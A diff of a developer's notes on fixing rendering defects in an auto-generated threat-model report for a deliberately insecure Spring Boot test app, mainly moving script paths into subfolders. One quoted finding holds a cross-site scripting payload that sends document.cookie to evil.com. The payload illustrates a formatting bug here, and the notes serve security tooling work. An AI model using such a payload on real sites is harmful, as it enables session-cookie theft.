@@ -21,9 +21,9 @@ The reference fixture is the intentionally-insecure app:
 - **Repo:** `/home/mrohr/1/insecure-spring-app` (Spring Boot; ground truth in
   its `EXPECTED-FINDINGS.md`).
 - **Rendered output under test:** `/home/mrohr/1/insecure-spring-app/docs/security/threat-model.md`
-  (built by `scripts/compose_threat_model.py`; `.fragments/` + `threat-model.yaml`
+  (built by `scripts/renderers/compose_threat_model.py`; `.fragments/` + `threat-model.yaml`
   are the inputs). Re-render after any change with:
-  `python3 scripts/compose_threat_model.py --output-dir <that dir> --strict`
+  `python3 scripts/renderers/compose_threat_model.py --output-dir <that dir> --strict`
 
 **Baseline defect counts (captured 2026-07-13; re-run to confirm before fixing
 and expect them to drop to ~0 after):**
@@ -54,7 +54,7 @@ the acceptance eyeball for A–D.
 Dockerfile/YAML/shell snippet renders `// Dockerfile:13` — `//` is not a valid
 comment there.
 
-**Exact site — `scripts/compose_threat_model.py:14258`:**
+**Exact site — `scripts/renderers/compose_threat_model.py:14258`:**
 ```python
 snippet_block = f"```{lang}\n// {ev_file}:{ev_line}\n{snippet_text}\n```"
 ```
@@ -95,7 +95,7 @@ present it as if it were real evidence.
 **Fix (renderer-side, deterministic):** treat an evidence line as degenerate when
 `ev_line <= 1` **or** the resolved snippet is import/package-only (reuse the
 `_is_import_line` / `_is_comment_only` logic already in
-`scripts/validate_evidence_lines.py:193-199`). When degenerate:
+`scripts/validators/validate_evidence_lines.py:193-199`). When degenerate:
 1. do **not** emit `snippet_block` (no misleading code fence);
 2. do **not** append `:1` to the card title or Location — show the file only
    (e.g. `OutputPreviewController.java` without `:1`).
@@ -112,7 +112,7 @@ without `:1`; a finding with `line = 19` on real code renders the fence as today
 F-031: `displayName=<script`>fetch('//evil.com/?c='+`document.cookie`)`</script>`.
 
 **Site:** this is *prose*, not the evidence fence — it comes from the authored
-scenario/issue text and passes through `scripts/apply_prose_fixes.py`.
+scenario/issue text and passes through `scripts/repairs/apply_prose_fixes.py`.
 
 **Fix:** add a prose-fixer pass that detects an inline attack-payload/URL
 containing angle brackets or `<script` mixed with stray backticks and either (a)
@@ -162,18 +162,18 @@ same low-risk vein as the P2a triage/render fixes already on `dev`.
 
 ## Reference index (verified 2026-07-13)
 
-- Fence assembly + hardcoded `//`: `compose_threat_model.py:14258`.
-- Snippet read (line=1 passes): `compose_threat_model.py:13149` (`_read_evidence_snippet`).
-- Fence language map: `compose_threat_model.py:13200` (`_lang_class_for_file`).
-- Snippet-relevance gate: `compose_threat_model.py:14242` (`snippet_relevant`).
-- Degenerate-line helpers to reuse: `validate_evidence_lines.py:193-217`
+- Fence assembly + hardcoded `//`: `renderers/compose_threat_model.py:14258`.
+- Snippet read (line=1 passes): `renderers/compose_threat_model.py:13149` (`_read_evidence_snippet`).
+- Fence language map: `renderers/compose_threat_model.py:13200` (`_lang_class_for_file`).
+- Snippet-relevance gate: `renderers/compose_threat_model.py:14242` (`snippet_relevant`).
+- Degenerate-line helpers to reuse: `validators/validate_evidence_lines.py:193-217`
   (`_is_import_line`, `_is_comment_only`).
-- Issue paragraphizer: `compose_threat_model.py:5012` (`_paragraphize_issue_card`).
-- Templated root cause: `compose_threat_model.py:3819` (`_derive_tier_root_causes`),
+- Issue paragraphizer: `renderers/compose_threat_model.py:5012` (`_paragraphize_issue_card`).
+- Templated root cause: `renderers/compose_threat_model.py:3819` (`_derive_tier_root_causes`),
   consumed via `tier_root_causes`.
-- Evidence claim: `compose_threat_model.py:13373` (`_build_evidence_claim`).
-- Severity depth knobs: `compose_threat_model.py:13235` (`_FINDING_DEPTH`).
-- Prose fixer: `scripts/apply_prose_fixes.py`.
+- Evidence claim: `renderers/compose_threat_model.py:13373` (`_build_evidence_claim`).
+- Severity depth knobs: `renderers/compose_threat_model.py:13235` (`_FINDING_DEPTH`).
+- Prose fixer: `scripts/repairs/apply_prose_fixes.py`.
 - Reference model + baseline counts: this file, §0.
 
 ---
@@ -184,8 +184,8 @@ Verified the plan against code + the reference report first; two §C/§D
 fundstellen were wrong and are corrected here.
 
 **Done — "code not shown as code" (broader than §C):** the garbled/over-eager
-inline formatting is **not** in `apply_prose_fixes.py` — it is
-`_codify_inline_identifiers` (`compose_threat_model.py:13620`). Reworked its two
+inline formatting is **not** in `repairs/apply_prose_fixes.py` — it is
+`_codify_inline_identifiers` (`renderers/compose_threat_model.py:13620`). Reworked its two
 ambiguous matchers from *fail-open* (wrap everything, subtract a brand allowlist)
 to *fail-closed* (wrap only on positive code evidence):
 - `_file_token_is_product_name` — bare `Node.js`/`Fastify.js`/`Koa.js` (JS-ext,
